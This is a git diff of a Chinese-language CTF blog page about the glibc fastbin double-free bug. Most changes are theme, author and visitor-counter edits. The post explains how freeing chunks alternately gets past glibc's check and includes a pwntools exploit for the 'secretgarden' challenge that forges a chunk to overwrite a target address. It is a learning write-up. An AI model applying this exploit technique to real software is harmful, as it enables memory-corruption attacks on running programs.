@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="#double free 漏洞 介绍 double free漏洞就是明面上的意思，即可以对一个chunk free两次，由于在free的时候，glibc只对main_arena指向的堆块进行检查，即只有当main_arena直接指向的chunk和将要free的hchunk是同一个chunk时程序才会报”double free”错误，也就是说我们只要间隔free就能绕过这个检测。如下：">
@@ -31,7 +31,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2018-07-23T00:37:40.000Z">
 <meta property="article:modified_time" content="2020-07-06T02:08:50.348Z">
-<meta property="article:author" content="xdw">
+<meta property="article:author" content="XDW">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
@@ -144,29 +144,9 @@
     <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">43</span></a>
 
   </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">30</span></a>
-
-  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">56</span></a>
-
-  </li>
-        <li class="menu-item menu-item-schedule">
-
-    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
-
-  </li>
-        <li class="menu-item menu-item-sitemap">
-
-    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
-
-  </li>
-        <li class="menu-item menu-item-commonweal">
-
-    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
 
   </li>
   </ul>
@@ -203,7 +183,9 @@
 
       <section class="site-overview-wrap sidebar-panel">
         <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">xdw</p>
+    <img class="site-author-image" itemprop="image" alt="XDW"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">XDW</p>
   <div class="site-description" itemprop="description">一枚很菜但是仍在学习的二进制菜逼</div>
 </div>
 <div class="site-state-wrap animated">
@@ -217,7 +199,6 @@
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-          
         <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
@@ -231,6 +212,16 @@
 </div>
 
 
+  <div class="links-of-blogroll animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ixuchao.cn/" title="https:&#x2F;&#x2F;blog.ixuchao.cn&#x2F;" rel="noopener" target="_blank">Archerx's Blog</a>
+        </li>
+    </ul>
+  </div>
 
       </section>
     </div>
@@ -263,8 +254,8 @@
     <link itemprop="mainEntityOfPage" href="https://driverxdw.github.io/2018/07/23/double_free/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="xdw">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="XDW">
       <meta itemprop="description" content="一枚很菜但是仍在学习的二进制菜逼">
     </span>
 
@@ -307,6 +298,13 @@
     </span>
 
   
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
 </div>
 
         </div>
@@ -316,19 +314,19 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <html><head></head><body><p>#double free 漏洞 介绍</p>
+        <p>#double free 漏洞 介绍</p>
 <p>double free漏洞就是明面上的意思，即可以对一个chunk free两次，由于在free的时候，glibc只对main_arena指向的堆块进行检查，即只有当main_arena直接指向的chunk和将要free的hchunk是同一个chunk时程序才会报”double free”错误，也就是说我们只要间隔free就能绕过这个检测。<br>如下：</p>
 <a id="more"></a>
 <p>int main(void)<br>{<br>    void <em>chunk1,</em>chunk2,*chunk3;<br>    chunk1=malloc(0x10);<br>    chunk2=malloc(0x10);</p>
 <pre><code>free(chunk1);
 free(chunk2);
 free(chunk1);
-return 0;</code></pre><p>}<br>第一次释放free chunk1时，fastbin中链表结构arena->chunk1->NULL<br>第二次释放free chunk2时，fastbin中链表结构arena->chunk2->chunk1->NULL<br>此时若free的是chunk2则glibc就能检测到double free从而报错<br>第三次释放free chunk1时，fastbin中链表结构arena->chunk1->chunk2->chunk1->chunk2</p>
+return 0;</code></pre><p>}<br>第一次释放free chunk1时，fastbin中链表结构arena-&gt;chunk1-&gt;NULL<br>第二次释放free chunk2时，fastbin中链表结构arena-&gt;chunk2-&gt;chunk1-&gt;NULL<br>此时若free的是chunk2则glibc就能检测到double free从而报错<br>第三次释放free chunk1时，fastbin中链表结构arena-&gt;chunk1-&gt;chunk2-&gt;chunk1-&gt;chunk2</p>
 <p>此时若能够在chunk被malloc后修改其fd指向则fastbin中的chunk1也指向修改的地址，如果这个地址时攻击者精心构造过的，那么就能造成一个任意地址写的漏洞。<br>chunk1被malloc后我们再malloc2次指定大小的size后，再下一次就可以在任意地址构造chunk，改写任意地址内容了。</p>
 <p>此题就是一个double free的白板题，可以帮助了解double free.<br>exp 如下：</p>
-<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="hljs-string">'./secretgarden'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raiseflower</span><span class="hljs-params">(length,name,color)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(<span class="hljs-string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(color)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">visit</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(<span class="hljs-string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove</span><span class="hljs-params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(<span class="hljs-string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clean</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(<span class="hljs-string">"4"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="hljs-number">0x400c7b</span></span><br><span class="line">fake_chunk = <span class="hljs-number">0x601ffa</span></span><br><span class="line">raiseflower(<span class="hljs-number">0x50</span>,<span class="hljs-string">"da"</span>,<span class="hljs-string">"red"</span>)</span><br><span class="line">raiseflower(<span class="hljs-number">0x50</span>,<span class="hljs-string">"da"</span>,<span class="hljs-string">"red"</span>)</span><br><span class="line">remove(<span class="hljs-number">0</span>)</span><br><span class="line">remove(<span class="hljs-number">1</span>)</span><br><span class="line">remove(<span class="hljs-number">0</span>)</span><br><span class="line">raiseflower(<span class="hljs-number">0x50</span>,p64(fake_chunk),<span class="hljs-string">"blue"</span>)</span><br><span class="line">raiseflower(<span class="hljs-number">0x50</span>,<span class="hljs-string">"da"</span>,<span class="hljs-string">"red"</span>)</span><br><span class="line">raiseflower(<span class="hljs-number">0x50</span>,<span class="hljs-string">"da"</span>,<span class="hljs-string">"red"</span>)</span><br><span class="line">raiseflower(<span class="hljs-number">0x50</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">6</span> + p64(<span class="hljs-number">0</span>) + p64(magic)*<span class="hljs-number">2</span> ,<span class="hljs-string">"red"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./secretgarden'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raiseflower</span><span class="params">(length,name,color)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(color)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400c7b</span></span><br><span class="line">fake_chunk = <span class="number">0x601ffa</span></span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"da"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"da"</span>,<span class="string">"red"</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,p64(fake_chunk),<span class="string">"blue"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"da"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"da"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"a"</span>*<span class="number">6</span> + p64(<span class="number">0</span>) + p64(magic)*<span class="number">2</span> ,<span class="string">"red"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-</body></html>
+
     </div>
 
     
@@ -403,10 +401,40 @@ return 0;</code></pre><p>}<br>第一次释放free chunk1时，fastbin中链表�
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">xdw</span>
+  <span class="author" itemprop="copyrightHolder">XDW</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
+
+#<div class="powered-by">
+#    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+#    <i class="fa fa-user-md"></i>
+#    <span id="busuanzi_container_site_uv">
+#        本站访客数:<span id="busuanzi_value_site_uv"></span>
+#    </span>
+#    <span class="post-meta-divider">|</span>
+#    <span id="busuanzi_container_site_pv">
+#        本站访问量<span id="busuanzi_value_site_pv"></span>
+#    </span>
+#</div>
 
     </div>
   </footer>
@@ -432,6 +460,7 @@ return 0;</code></pre><p>}<br>第一次释放free chunk1时，fastbin中链表�
 
 
   
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
